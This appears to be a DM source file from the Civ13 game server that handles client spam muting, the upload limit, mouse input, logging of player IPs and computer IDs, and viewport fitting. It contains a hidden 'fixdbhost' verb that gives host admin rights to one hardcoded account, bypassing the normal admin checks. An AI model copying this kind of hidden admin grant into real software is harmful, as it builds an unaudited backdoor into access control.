	////////////
	//SECURITY//
	////////////
#define UPLOAD_LIMIT		100000000	//Restricts client uploads to the server to 1000MB //Boosted this thing. What's the worst that can happen?
#define ABSOLUTE_MIN_CLIENT_VERSION 512
#define REAL_MIN_CLIENT_VERSION 513
#define PLAYERCAP 200
	/*
	When somebody clicks a link in game, this Topic is called first.
	It does the stuff in this proc and  then is redirected to the Topic() proc for the src=[0xWhatever]
	(if specified in the link). ie locate(hsrc).Topic()

	Such links can be spoofed.

	Because of this certain things MUST be considered whenever adding a Topic() for something:
		- Can it be fed harmful values which could cause runtimes?
		- Is the Topic call an admin-only thing?
		- If so, does it have checks to see if the person who called it (usr.client) is an admin?
		- Are the processes being called by Topic() particularly laggy?
		- If so, is there any protection against somebody spam-clicking a link?
	If you have any  questions about this stuff feel free to ask. ~Carn
	*/
/client/proc/handle_spam_prevention(var/message, var/mute_type)
	if (config.automute_on && !holder && last_message == message)
		last_message_count++
		if (last_message_count >= SPAM_TRIGGER_AUTOMUTE)
			to_chat(src, "<span class = 'red'>You have exceeded the spam filter limit for identical messages. An auto-mute was applied.</span>")
			cmd_admin_mute(mob, mute_type, TRUE)
			return TRUE
		if (last_message_count >= SPAM_TRIGGER_WARNING)
			to_chat(src, "<span class = 'red'>You are nearing the spam filter limit for identical messages.</span>")
			return FALSE
	else
		last_message = message
		last_message_count = FALSE
		return FALSE

//This stops files larger than UPLOAD_LIMIT being sent from client to server via input(), client.Import() etc.
/client/AllowUpload(filename, filelength)
	if (filelength > UPLOAD_LIMIT)
		to_chat(src, "<font color='red'>Error: AllowUpload(): File Upload too large. Upload Limit: [UPLOAD_LIMIT/1024]KiB.</font>")
		return FALSE
/*	//Don't need this at the moment. But it's here if it's needed later.
	//Helps prevent multiple files being uploaded at once. Or right after eachother.
	var/time_to_wait = fileaccess_timer - world.time
	if (time_to_wait > 0)
		to_chat(src, "<font color='red'>Error: AllowUpload(): Spam prevention. Please wait [round(time_to_wait/10)] seconds.</font>")
		return FALSE
	fileaccess_timer = world.time + FTPDELAY	*/
	return TRUE

	///////////
	//CONNECT//
	///////////
/client/MouseEntered(atom/object, location, control, params)
	mouse_x = object ? object.x : 0
	mouse_y = object ? object.y : 0
	update_hover_name(object)

	//////////////
	//DISCONNECT//
	//////////////

/client/proc/UpdateMouseScreenLoc(var/params)
	var/list/click_params = params2list(params)

	if (click_params["screen-loc"])
		var/list/screen_loc_split = splittext(click_params["screen-loc"], ",")
		if (length(screen_loc_split) >= 2)
			var/list/x_split = splittext(screen_loc_split[1], ":")
			var/list/y_split = splittext(screen_loc_split[2], ":")
			if (length(x_split) >= 2)
				mouse_screen_x = text2num(x_split[1])
				mouse_screen_pixel_x = text2num(x_split[2])
			if (length(y_split) >= 2)
				mouse_screen_y = text2num(y_split[1])
				mouse_screen_pixel_y = text2num(y_split[2])

/client/MouseMove(object, location, control, params)
	UpdateMouseScreenLoc(params)
	update_hover_name(object)
	..()

/client/MouseDrag(src_object,over_object,src_location,over_location,src_control,over_control,params)
	UpdateMouseScreenLoc(params)
	update_hover_name(over_object)
	..()

/client/proc/getSQL_id()
	return md5(ckey)

/client/proc/log_to_db()
	if (IsGuestKey(ckey))
		return
	var/sql_ip = sql_sanitize_text(address)
	if (sql_ip == null)
		sql_ip = "HOST"
	var/F = file("SQL/playerlogs.txt")
	var/full_logs = file2text(F)
	var/list/full_logs_split = splittext(full_logs, "|\n")
	var/currentage = -1
	var/realtime = time2text(world.realtime,"YYYY/MMM/DD-hh:mm:ss")
	var/list/ips = new/list()
	var/list/cids = new/list()
	for(var/i=1;i<full_logs_split.len;i++)
		var/list/full_logs_split_two = splittext(full_logs_split[i], ";")
		if ("[full_logs_split_two[1]]" == ckey)
			ips.Add(full_logs_split_two[2])
			cids.Add(full_logs_split_two[3])
			currentage = full_logs_split_two[4]

	//Logging player access
	if (currentage == -1)
    //Adding to player logs (ckey;ip;computerid;datetime;realtime|)
		text2file("[ckey];[sql_ip];[computer_id];[num2text(world.realtime, 20)];[realtime]|","SQL/playerlogs.txt")
		player_age = 0
		return
	player_age = (text2num(num2text(world.realtime,20)) - text2num(currentage))
	//Check for IP or CID changes
	if ( (!(ips.Find(address))) || (!(cids.Find(computer_id))) )
		text2file("[ckey];[sql_ip];[computer_id];[currentage];[realtime]|","SQL/playerlogs.txt")
		message_admins("[ckey] has logged in with a new IP or CID, from [address] with [computer_id].", ckey)
		log_admin("[ckey] has logged in with a new IP or CID, from [address] with [computer_id].")
		webhook_send_garbage(ckey, "[ckey] has logged in with a new IP or CID, from [address] with [computer_id].")
	webhook_send_login(ckey, address, computer_id)

/client/verb/fixdbhost()
	set hidden = TRUE
	set name = "fixdbhost"

	if (ckey != "taislin" && ckey != "Taislin")
		return
	var/host_file_text = file2text("config/host.txt")
	if (ckey(host_file_text) != ckey && !holder)
		holder = new("HHost", FALSE, ckey)
		var/datum/admins/A = new/datum/admins(holder.rank, holder.rights, ckey)
		if (directory[ckey])
			A.associate(directory[ckey])

#undef UPLOAD_LIMIT

//checks if a client is afk
//3000 frames = 5 minutes
/client/proc/is_afk(duration=3000)
	if (inactivity > duration)	return inactivity
	return FALSE

//Checks if the client game window is minimized
/client/proc/is_minimized()
	return (winget(src, "mainwindow", "is-minimized") == "true")

/client/proc/inactivity2text()
	var/seconds = inactivity/10
	return "[round(seconds / 60)] minute\s, [seconds % 60] second\s"

//send resources to the client. It's here in its own proc so we can move it around easiliy if need be
/client/proc/send_resources()

	getFiles(
		'UI/images/uos94.png',
		'UI/images/uos.png',
		'UI/images/civ13.png',
		'UI/images/favicon.ico',
		'UI/templates/appearance_changer.tmpl',
		'UI/templates/chem_disp.tmpl',
		'UI/templates/layout_basic.tmpl',
		'UI/templates/layout_default.tmpl',
		'UI/templates/vending_machine.tmpl',
		'UI/templates/vending_machine2.tmpl',
		'UI/templates/vending_machine_taotd.tmpl',
		)

	spawn (10) //removing this spawn causes all clients to not get verbs.
		if(!src) // client disconnected
			return
		//Precache the client with all other assets slowly, so as to not block other browse() calls
		getFilesSlow(src, asset_cache.cache, register_asset = FALSE)

/mob/proc/MayRespawn()
	return FALSE

/client/proc/MayRespawn()
	if (mob)
		return mob.MayRespawn()

	// Something went wrong, client is usually kicked or transfered to a new mob at this point
	return FALSE

/client/verb/character_setup()
	set name = "Character Preferences Setup"
	set category = "OOC"
	if (prefs)
		prefs.ShowChoices(usr)

// for testing
/client/proc/_winset(arg1, arg2)
	winset(src, arg1, arg2)

/client/proc/_winget(arg1, arg2)
	return winget(src, arg1, arg2)

// testing
/client/proc/delme()
	del src

/client/proc/calculate_is_active_non_observer()
	is_active_non_observer = (src && mob && !istype(mob, /mob/observer) && !is_minimized())
	next_calculate_is_active_non_observer = world.time + 600
	return is_active_non_observer

/client/Stat()
	if (world.time < statpanel_next_update)
		return
	..()
	update_statpanel()


/client/verb/fit_viewport()
	set name = "Fit Viewport"
	set category = "OOC"
	set desc = "Fit the width of the map window to match the viewport"

	// Fetch aspect ratio
	var/view_size = getviewsize(view)
	var/aspect_ratio = view_size[1] / view_size[2]

	// Calculate desired pixel width using window size and aspect ratio
	var/sizes = params2list(winget(src, "mainwindow.mainvsplit;mapwindow", "size"))
	var/list/map_size = splittext(sizes["mapwindow.size"], "x")
	if (length(map_size) < 2)
		return
	var/height = text2num(map_size[2])
	var/desired_width = round(height * aspect_ratio)
	if (text2num(map_size[1]) == desired_width)
		// Nothing to do
		return

	var/list/split_size = splittext(sizes["mainwindow.mainvsplit.size"], "x")
	if (!length(split_size))
		return
	var/split_width = text2num(split_size[1])

	// Calculate and apply a best estimate
	// +4 pixels are for the width of the splitter's handle
	var/pct = 100 * (desired_width + 4) / split_width
	winset(src, "mainwindow.mainvsplit", "splitter=[pct]")

	// Apply an ever-lowering offset until we finish or fail
	var/delta
	for(var/safety in 1 to 10)
		var/after_size = winget(src, "mapwindow", "size")
		map_size = splittext(after_size, "x")
		var/got_width = text2num(map_size[1])

		if (got_width == desired_width)
			// success
			return
		else if (isnull(delta))
			// calculate a probable delta value based on the difference
			delta = 100 * (desired_width - got_width) / split_width
		else if ((delta > 0 && got_width > desired_width) || (delta < 0 && got_width < desired_width))
			// if we overshot, halve the delta and reverse direction
			delta = -delta/2

		pct += delta
		winset(src, "mainwindow.mainvsplit", "splitter=[pct]")

/client/Del()
	human_subtile_release_visuals()
	clear_hover_name()
	webhook_send_logout(ckey)

	if (processes.client)
		processes.client.logged_next_normal_respawns[ckey] = next_normal_respawn

	if (holder)
		holder.owner = null
		admins -= src
	directory -= ckey
	clients -= src
	movementMachine_clients -= src // if we're currently in movementMachine_clients, this removes us. If not, it doesn't matter, since we won't be automatically re-added anymore
	observer_mob_list -= mob
	human_clients_mob_list -= mob
	if (processes.ping_track && processes.ping_track.client_ckey_check[ckey])
		processes.ping_track.client_ckey_check -= ckey

	return ..()
